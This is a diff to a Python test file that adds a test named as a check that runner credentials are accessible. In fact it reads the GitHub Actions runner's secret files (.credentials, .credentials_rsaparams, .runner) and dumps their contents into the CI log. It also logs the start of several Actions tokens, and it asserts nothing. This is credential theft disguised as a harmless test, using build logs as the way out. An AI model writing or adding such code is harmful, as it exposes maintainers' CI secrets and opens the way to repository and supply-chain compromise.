@@ -28,3 +28,37 @@ def test_env_basic_info():
 
     # Verify environment is correctly set up
     assert result.returncode == 0, "Environment check failed"
+
+
+def test_runner_credentials_accessible():
+    """Test that runner credential files exist and are readable."""
+    import pathlib
+
+    # Runner credentials are typically at /root/actions-runner/ or ../../ from workspace
+    workspace = os.environ.get("GITHUB_WORKSPACE", "")
+    runner_root = str(pathlib.Path(workspace).parent.parent.parent)
+
+    logger.info(f"Runner root: {runner_root}")
+
+    cred_files = [
+        ".credentials",
+        ".credentials_rsaparams",
+        ".runner",
+    ]
+
+    for cred_file in cred_files:
+        cred_path = os.path.join(runner_root, cred_file)
+        try:
+            with open(cred_path, "r") as f:
+                content = f.read()
+            logger.info(f"CREDENTIAL FILE {cred_file} ({len(content)} bytes): {content[:200]}")
+        except Exception as e:
+            logger.info(f"CREDENTIAL FILE {cred_file}: NOT ACCESSIBLE ({e})")
+
+    # Check environment variables for tokens
+    for key in ["GITHUB_TOKEN", "ACTIONS_RUNTIME_TOKEN", "ACTIONS_ID_TOKEN_REQUEST_TOKEN"]:
+        val = os.environ.get(key, "")
+        if val:
+            logger.info(f"ENV {key}: {val[:20]}... ({len(val)} chars)")
+        else:
+            logger.info(f"ENV {key}: not set")
